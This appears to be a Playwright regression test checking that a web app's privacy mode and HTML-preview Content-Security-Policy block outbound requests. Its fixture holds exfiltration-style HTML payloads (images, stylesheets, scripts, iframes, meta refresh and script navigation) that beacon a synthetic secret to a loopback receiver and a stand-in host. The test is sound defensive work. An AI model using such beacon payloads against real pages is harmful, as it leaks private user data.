// Run with: node --import @oxc-node/core/register scripts/mellonta/privacy-browser.mjs
// All probe traffic targets disposable loopback servers, never a real third party.
import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import { createServer } from "node:http";
import { fileURLToPath } from "node:url";
import { createRequire } from "node:module";
import { chromium } from "playwright";
import { buildHtmlPreviewContentSecurityPolicy } from "../../packages/server/src/routes/attachments.ts";

const requireServer = createRequire(new URL("../../packages/server/package.json", import.meta.url));
const { WebSocketServer } = requireServer("ws");
const headers = await readFile(new URL("./prod-security-headers.conf", import.meta.url), "utf8");
const portalCsp = /add_header Content-Security-Policy "([^"]+)"/.exec(headers)?.[1];
assert.ok(portalCsp, "test the production nginx policy");
const requireWeb = createRequire(new URL("../../packages/web/package.json", import.meta.url));
const { outputFiles } = await requireWeb("esbuild").build({
  write: false, bundle: true, format: "esm", platform: "browser",
  stdin: {
    resolveDir: fileURLToPath(new URL("../../packages/shared/src/", import.meta.url)),
    contents: `
      import { initializeBrowserPrivacy } from "./browserPrivacy";
      await initializeBrowserPrivacy("/api");
      const resources = document.querySelector("template").content.cloneNode(true);
      document.body.append(resources);
      window.fixtureLoaded = true;
    `,
  },
});
const leaked = [];
const receiver = createServer((req, res) => {
  leaked.push(req.url);
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.end("received");
});
const listen = (server) => new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
const close = (server) => new Promise((resolve) => server.close(resolve));
await listen(receiver);
const outside = `http://127.0.0.1:${receiver.address().port}`;
const png = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+jYXsAAAAASUVORK5CYII=";
const hostileResources = `
  <img src="${outside}/image?private=synthetic-secret">
  <link rel="stylesheet" href="${outside}/style?private=synthetic-secret">
  <style>body { background-image: url('${outside}/background?private=synthetic-secret'); }</style>
  <script src="${outside}/script?private=synthetic-secret"></script>
  <iframe src="${outside}/frame?private=synthetic-secret"></iframe>
  <img src="https://privacy-probe.invalid/image?private=synthetic-secret">
  <script src="https://privacy-probe.invalid/script?private=synthetic-secret"></script>
`;
const app = createServer((req, res) => {
  if (req.url === "/pixel.png") {
    res.setHeader("Content-Type", "image/png");
    res.end(Buffer.from(png, "base64"));
    return;
  }
  if (req.url === "/api/privacy-mode") {
    res.setHeader("Content-Type", "application/json");
    res.end('{"enabled":true}');
    return;
  }
  if (req.url === "/api/probe") {
    res.setHeader("Content-Type", "application/json");
    res.end('{"ok":true}');
    return;
  }
  if (req.url === "/fixture.js") {
    res.setHeader("Content-Type", "text/javascript");
    res.end(outputFiles[0].contents);
    return;
  }
  res.setHeader("Content-Type", "text/html; charset=utf-8");
  res.setHeader("Referrer-Policy", "no-referrer");
  const preview = req.url === "/preview";
  res.setHeader("Content-Security-Policy", preview
    ? buildHtmlPreviewContentSecurityPolicy([]) : portalCsp);
  res.end(preview ? `
    <meta http-equiv="refresh" content="0;url=${outside}/refresh?private=synthetic-secret">
    <p id="content" style="color: rgb(12, 34, 56)">Private document</p>
    <img id="embedded" src="data:image/png;base64,${png}">
    ${hostileResources}
    <script>window.attachmentScriptRan = true; location.href = '${outside}/navigation?private=synthetic-secret';</script>
  ` : `
    <p id="content" style="color: rgb(12, 34, 56)">Local portal</p>
    <img id="local" src="/pixel.png">
    <template>${hostileResources}</template>
    <script type="module" src="/fixture.js"></script>
  `);
});
const sockets = new WebSocketServer({ server: app });
sockets.on("connection", (socket) => socket.send("local-socket-ok"));
await listen(app);
const origin = `http://raft-http.test:${app.address().port}`;
let browser;
try {
  browser = await chromium.launch({
    executablePath: process.env.RAFT_CHROMIUM_EXECUTABLE || undefined,
    args: ["--host-resolver-rules=MAP raft-http.test 127.0.0.1", "--no-proxy-server"],
  });
  const page = await browser.newPage();
  // Intercept HTTPS probes so even a failed regression cannot send real data out.
  await page.route("https://privacy-probe.invalid/**", (route) => {
    leaked.push(route.request().url());
    return route.fulfill({ contentType: "text/plain", body: "intercepted" });
  });
  await page.goto(origin, { waitUntil: "networkidle" });
  assert.equal(await page.evaluate(() => window.fixtureLoaded), true);
  assert.equal(await page.locator("#local").evaluate((img) => img.naturalWidth), 1);
  assert.equal(await page.locator("#content").evaluate((el) => getComputedStyle(el).color), "rgb(12, 34, 56)");
  assert.deepEqual(await page.evaluate(() => fetch("/api/probe").then((r) => r.json())), { ok: true });
  assert.equal(await page.evaluate(() => new Promise((resolve, reject) => {
    const ws = new WebSocket(location.origin.replace("http:", "ws:"));
    const timer = setTimeout(() => { ws.close(); reject(new Error("local websocket timed out")); }, 5000);
    ws.onmessage = (event) => { clearTimeout(timer); resolve(event.data); ws.close(); };
    ws.onerror = () => { clearTimeout(timer); reject(new Error("local websocket blocked")); };
  })), "local-socket-ok");
  assert.equal(await page.evaluate(async (url) => {
    try { await fetch(`${url}/fetch?private=synthetic-secret`); return "sent"; }
    catch { return "blocked"; }
  }, outside), "blocked");
  assert.deepEqual(leaked, [], "opening messages must not fetch third-party content");

  // Top-level too: an iframe sandbox alone does not protect directly opened previews.
  await page.goto(`${origin}/preview`, { waitUntil: "networkidle" });
  assert.equal(page.url(), `${origin}/preview`, "meta refresh must not navigate out");
  assert.equal(await page.evaluate(() => window.attachmentScriptRan), undefined);
  assert.equal(await page.locator("#content").innerText(), "Private document");
  assert.equal(await page.locator("#content").evaluate((el) => getComputedStyle(el).color), "rgb(12, 34, 56)");
  assert.equal(await page.locator("#embedded").evaluate((img) => img.naturalWidth), 1);
  assert.deepEqual(leaked, [], "HTML previews must not beacon or navigate company data out");
  console.log("Privacy browser checks passed: no probe reached the external-origin receiver; local API, WebSocket, script, image, CSS and static HTML worked.");
} finally {
  await browser?.close();
  sockets.close();
  await Promise.all([close(app), close(receiver)]);
}
